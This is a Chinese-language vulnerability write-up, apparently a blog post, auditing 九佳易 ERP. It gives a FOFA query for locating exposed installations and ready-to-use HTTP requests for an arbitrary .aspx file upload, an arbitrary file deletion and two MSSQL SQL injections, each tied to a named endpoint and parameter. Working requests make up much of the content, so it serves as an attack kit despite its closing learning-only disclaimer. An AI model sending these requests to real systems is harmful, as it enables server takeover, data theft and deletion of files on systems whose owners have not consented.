#  代码审计 | 九佳易ERP漏洞分析  
原创 学安全的猪
                    学安全的猪  学安全的猪   2026-03-15 10:31  
  
概述  
  
九佳易ERP存在文件上传、文件删除、SQL注入等漏洞。  
```
fofa: body="/Scripts/Login_A8/"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/99OCEp0Lz4S9ibKo4UvDR6w1CLoMrdz1ib4OWdpcwy2FW8BXqdQ66pO409NicDtJL8ib7JIeK2XfJmxgVFVlvodiaouMbhiako5UpLLbANVmE6m1k/640?wx_fmt=png&from=appmsg "")  
  
任意文件上传  
  
weshop/Comm/PicUploadIMG.ashx对应A8ERP.weshop.Comm.PicUploadIMG类，调用SaveIndexBgFile()方法上传文件，文件保存目录为网站目录+"weshoppics"+curTplb，curTplb通过传参控制，中间的SQL查询实现同curTplb文件夹下文件名从001开始递增，文件后缀从上传文件中获取无过滤，存在任意文件上传漏洞；  
  
![](https://mmbiz.qpic.cn/mmbiz_png/99OCEp0Lz4R8a0FsJe9xaUFUl1icBqjCPMT6atkaB2oNaA0dgazVf6kI8McH21CAgrO7AY09OFtafFcRTGBQeh4NQhpxicfgMB1EicUsHDZY7M/640?wx_fmt=png&from=appmsg "")  
```
POST/weshop/Comm/PicUploadIMG.ashx?curTplb=001HTTP/1.1
Host: x.x.x.x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJ7jrM31JCYae3wBT
Content-Length: 245

------WebKitFormBoundaryJ7jrM31JCYae3wBT
Content-Disposition: form-data; name="Filedata"; filename="test.aspx"

<%@ Page Language="C#" %><%Response.Write(Guid.NewGuid().ToString());Response.End();%>
------WebKitFormBoundaryJ7jrM31JCYae3wBT--
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/99OCEp0Lz4RFLWRhXMH8G3hB0jD3He6T1hSJ0f9xdOiaAKIu2pDhxjnJZHibiacd1SzbbS1rzfibUN3nEMgT5j9sttfwBM2eJCZJ51uArWTMfAo/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/99OCEp0Lz4TIjLWO3apUcYXhyNRjOgDtd6QpfiauRDOicdSRLEtsVsTdemBXX5GTGz5NE2eLUiaAcaTy3hRicpxc77bJc2IKpds4rKrtm2HmcWE/640?wx_fmt=png&from=appmsg "")  
  
其他类似上传点，weshop/Comm/PicUploadHander.ashx、upload/UploadHanderForTaoZhuang.ashx；  
  
文件删除  
  
weshop/Comm/PicDelHandler.ashx对应A8ERP.weshop.Comm.PicDelHandler类，当参数q和参数n不为空时调用DelPic()方法删除n对应的文件，参数n以斜杠分割为三段再拼接成windows路径，n需要是xx/xx/xx格式的，删除前面上传的文件n=weshoppics/001/009.aspx、删除网站目录下的文件n=//xx.txt，存在文件删除漏洞；  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/99OCEp0Lz4RpKZsfGc26Iz9NHSJDxZgASV7wlpToH2Rl3pYmoxWnLTTPtHpX4UndTfSpcAVe5qrEdf2C9ClEZLTYJ9ZmuIjSA4qicHoibnPvU/640?wx_fmt=png&from=appmsg "")  
```
GET /weshop/Comm/PicDelHandler.ashx?q=1&n=weshoppics/001/009.aspx HTTP/1.1
Host: x.x.x.x

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/99OCEp0Lz4QH4QmyibBvOc66LhwZdNEia51tqSibkePHvicV9GtBRqvDianrRK4jhK27jfeMukCxSEVLibaiadcszkg7iczE1AN7QTcKCDUEgpdTESU/640?wx_fmt=png&from=appmsg "")  
  
SQL注入  
  
SQL注入1，HuiYuan/Hyxfmx.aspx对应A8ERP.HuiYuan.Hyxfmx类，curWxh参数直接拼接到SQL语句中执行，存在SQL注入漏洞；  
  
![](https://mmbiz.qpic.cn/mmbiz_png/99OCEp0Lz4RFaKgfvvGX732X8YcXOXLdibb8nicU3tLCQhoLvTbH2V1ARboPibr5kibKynaibic1VEn84XexIoaP7Arp3tDiaqC7NqkbTSBVRquOYw/640?wx_fmt=png&from=appmsg "")  
```
GET /HuiYuan/Hyxfmx.aspx?curWxh=1')+and+1111+in+(select+sys.fn_sqlvarbasetostr(HashBytes('MD5','123')))--+ HTTP/1.1
Host: x.x.x.x

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/99OCEp0Lz4RwvaulBPzmKdh8J79ibaBic1z5yxlMhibtMR8MicUeCTy5c19YLyRFLVUPbuhibo6xsW2NL5Z0kTnytXaSOCpcickO1VaXKg6ttPgeo/640?wx_fmt=png&from=appmsg "")  
  
SQL注入2，HuiYuan/HuiYuanDangAn/picHY.aspx对应A8ERP.HuiYuan.HuiYuanDangAn.picHY类，hyh参数字符串拼接，存在SQL注入漏洞；  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/99OCEp0Lz4QtY5icQnsobsUHAiaAhmbwLuBJeg3X7qoZ6j11yGMYVGlD3wW1h0QicWxJlSrchzuYE3GQTWsUa2PmMk4PC2u0Va9w2w5dyUtWibc/640?wx_fmt=png&from=appmsg "")  
```
GET /HuiYuan/HuiYuanDangAn/picHY.aspx?hyh=1'union+select+sys.fn_sqlvarbasetostr(HashBytes('MD5','123'))--+ HTTP/1.1
Host: x.x.x.x

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/99OCEp0Lz4SKNCibo4kmBxucbMzrdwUoIofxj6Cia2tI8sej018vI8YjvIB3ZoBqdbNOhrAfibRHNK7RCmoic9p62ZGHNLvNIJBbkXwJs68Vnks/640?wx_fmt=png&from=appmsg "")  
  
免责声明：本文内容仅限于学习交流自查，旨在提高安全意识、加强安全防护。读者任何基于本文的操作均属个人行为，后果自负，与本文作者及本公众号无关。如有侵权请联系删除。  
  
